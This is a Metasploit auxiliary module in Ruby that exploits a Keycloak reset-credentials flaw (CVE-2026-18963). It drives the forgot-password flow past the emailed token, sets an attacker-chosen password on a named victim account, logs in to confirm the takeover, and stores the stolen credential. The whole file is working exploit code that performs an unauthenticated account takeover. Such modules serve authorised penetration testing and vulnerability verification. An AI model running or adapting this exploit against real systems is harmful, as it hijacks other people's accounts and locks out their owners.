##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Keycloak Reset Credentials Flow Account Takeover',
        'Description' => %q{
          Keycloak 26.7.0 and 26.7.1 ship a broken "try another way" credential selector
          in the reset-credentials (Forgot Password) flow (CVE-2026-18963). When the
          selector screen is shown it records a sticky note that is not scoped to the
          current authenticator execution, so an attacker can drive the email reset
          authenticator to success without ever presenting the token that Keycloak mailed
          to the account owner. The flow then advances straight to the update-password
          screen, which lets an unauthenticated attacker set a new password for any
          account in a realm that has Forgot Password enabled. The issue is fixed in
          26.7.2.

          This module walks the reset-credentials flow for a chosen victim, reaches the
          update-password screen without the emailed token, sets an attacker controlled
          password, and then logs in with it to confirm the takeover.
        },
        'Author' => [
          'venexy <predator0x300@gmail.com>'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-18963'],
          ['URL', 'https://www.keycloak.org/security']
        ],
        'DisclosureDate' => '2026-08-25',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Base path to Keycloak', '/']),
        OptString.new('REALM', [true, 'Target realm name', 'master']),
        OptString.new('CLIENT_ID', [true, 'OIDC client_id used to start the flow (any valid client in the realm)', 'account']),
        OptString.new('REDIRECT_URI', [false, 'redirect_uri valid for CLIENT_ID (blank uses the built-in account console URL)', '']),
        OptString.new('VICTIM', [true, 'Username or email of the account to take over']),
        OptString.new('NEW_PASSWORD', [false, 'Password to set on the victim account (blank generates one)', ''])
      ]
    )
  end

  def base_url
    vhost = datastore['VHOST'].to_s.empty? ? rhost : datastore['VHOST']
    "#{ssl ? 'https' : 'http'}://#{vhost}:#{rport}"
  end

  def redirect_uri
    return datastore['REDIRECT_URI'] unless datastore['REDIRECT_URI'].to_s.empty?

    "#{base_url}#{normalize_uri(target_uri.path, 'realms', datastore['REALM'], 'account')}/"
  end

  def new_password
    @new_password ||=
      if datastore['NEW_PASSWORD'].to_s.empty?
        "#{Rex::Text.rand_text_alpha_upper(1)}#{Rex::Text.rand_text_alpha_lower(7)}#{Rex::Text.rand_text_numeric(3)}!"
      else
        datastore['NEW_PASSWORD']
      end
  end

  def auth_code?(location)
    location.to_s =~ /[?&]code=/
  end

  def cookie_header
    @jar.map { |name, value| "#{name}=#{value}" }.join('; ')
  end

  # Keycloak sends deletions as empty-value Set-Cookie entries; mirror that in the jar.
  def merge_cookies(res)
    return unless res

    res.get_cookies.split(';').each do |pair|
      name, value = pair.strip.split('=', 2)
      next if name.nil? || name.empty?

      if value.nil? || value.empty?
        @jar.delete(name)
      else
        @jar[name] = value
      end
    end
  end

  # Send one request and follow same-origin redirects by hand. The reset flow bounces
  # through login-actions with a quoted KC_AUTH_SESSION_HASH cookie that trips up standard
  # cookie jars, so we carry cookies ourselves and stop the moment an OIDC code is issued
  # or a redirect leaves our origin (the client callback).
  def http_send(method, uri, form = nil, depth = 0)
    @last = uri
    req = { 'method' => method, 'uri' => uri, 'cookie' => cookie_header }
    req['vars_post'] = form if form
    res = send_request_cgi(req)
    return res unless res

    merge_cookies(res)
    return res unless depth < 8 && [301, 302, 303, 307, 308].include?(res.code)

    loc = res.headers['Location'] || res.headers['location']
    return res if loc.nil? || loc.empty?

    if auth_code?(loc)
      @last = loc
      return res
    end
    if loc =~ %r{\Ahttps?://}i
      return res unless loc.start_with?(base_url)

      path = loc[base_url.length..]
      path = '/' if path.to_s.empty?
      return http_send('GET', path, nil, depth + 1)
    end
    http_send('GET', loc, nil, depth + 1)
  end

  def form_action(html, form_id = nil)
    if form_id
      m = html.match(/<form[^>]*id="#{Regexp.escape(form_id)}"[^>]*\baction="([^"]+)"/i) ||
          html.match(/<form[^>]*\baction="([^"]+)"/i)
    else
      m = html.match(/<form[^>]*\baction="([^"]+)"/i)
    end
    m && m[1].gsub('&amp;', '&')
  end

  def auth_request
    http_send(
      'GET',
      "#{normalize_uri(target_uri.path, 'realms', datastore['REALM'], 'protocol', 'openid-connect', 'auth')}" \
        "?client_id=#{datastore['CLIENT_ID']}&redirect_uri=#{CGI.escape(redirect_uri)}&response_type=code&scope=openid"
    )
  end

  def check
    @jar = {}
    res = auth_request
    return Exploit::CheckCode::Unknown('No response from the Keycloak authentication endpoint') unless res

    unless res.code == 200 && res.body.to_s =~ /kc-form-login|login-actions/i
      return Exploit::CheckCode::Unknown("Unexpected reply (HTTP #{res.code}); check REALM and CLIENT_ID")
    end

    if res.body =~ %r{href="/realms/[^"]*reset-credentials[^"]*"}
      Exploit::CheckCode::Detected('reset-credentials flow is enabled; run to confirm the takeover (Keycloak does not disclose its version remotely)')
    else
      Exploit::CheckCode::Safe('Keycloak is reachable but the reset-credentials (Forgot Password) flow is disabled')
    end
  end

  def run
    @jar = {}
    victim = datastore['VICTIM']

    res = auth_request
    fail_with(Failure::Unreachable, 'No response from the Keycloak authentication endpoint') unless res
    link = res.body.to_s[%r{href="(/realms/[^"]*reset-credentials[^"]*)"}, 1]
    fail_with(Failure::NotVulnerable, 'No reset-credentials link on the login page (Forgot Password is disabled)') unless link

    # 1) open the reset flow and remember its URL for the sticky-note re-render
    res = step(http_send('GET', link.gsub('&amp;', '&')))
    reset_url = @last

    # 2) switch to "try another way" so Keycloak renders the credential selector
    res = step(http_send('POST', form_action(res.body), { 'tryAnotherWay' => 'on' }))
    selector = form_action(res.body, 'kc-select-credential-form') || form_action(res.body)
    fail_with(Failure::UnexpectedReply, 'Credential selector screen never rendered') unless selector

    # 3) name the victim on the selector; this sets the un-scoped sticky note
    step(http_send('POST', selector, { 'username' => victim }))

    # 4) re-render the reset screen, then drive the email authenticator to success
    #    with no token, which advances the flow to the update-password screen
    res = step(http_send('GET', reset_url))
    selector2 = form_action(res.body, 'kc-select-credential-form') || form_action(res.body)
    res = step(http_send('POST', selector2, {}))

    unless res.body.to_s.include?('password-new')
      fail_with(Failure::NotVulnerable, "Did not reach the update-password screen for #{victim}; the target is likely patched (>= 26.7.2)")
    end
    print_good("Reached the update-password screen for #{victim} without the emailed token")

    # 5) set the attacker password
    step(http_send('POST', form_action(res.body), { 'password-new' => new_password, 'password-confirm' => new_password }))
    print_status("Submitted a new password for #{victim}")

    # 6) prove it: log in with the new password and confirm an auth code comes back
    unless verify_login(victim)
      fail_with(Failure::UnexpectedReply, 'Password was set but login with it failed; the account may enforce additional required actions')
    end

    print_good("Account takeover confirmed: #{victim} : #{new_password}")
    report_cred(victim, new_password)
  end

  def verify_login(victim)
    @jar = {}
    res = auth_request
    return false unless res

    action = form_action(res.body)
    return false unless action

    http_send('POST', action, { 'username' => victim, 'password' => new_password })
    auth_code?(@last)
  end

  def report_cred(user, password)
    return unless framework.db.active

    service_data = {
      address: rhost,
      port: rport,
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_type: :password,
      private_data: password,
      username: user
    }.merge(service_data)
    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      access_level: 'User'
    }.merge(service_data)
    create_credential_login(login_data)
  end

  def step(res)
    fail_with(Failure::Unreachable, 'Lost connection during the reset-credentials flow') unless res
    res
  end
end
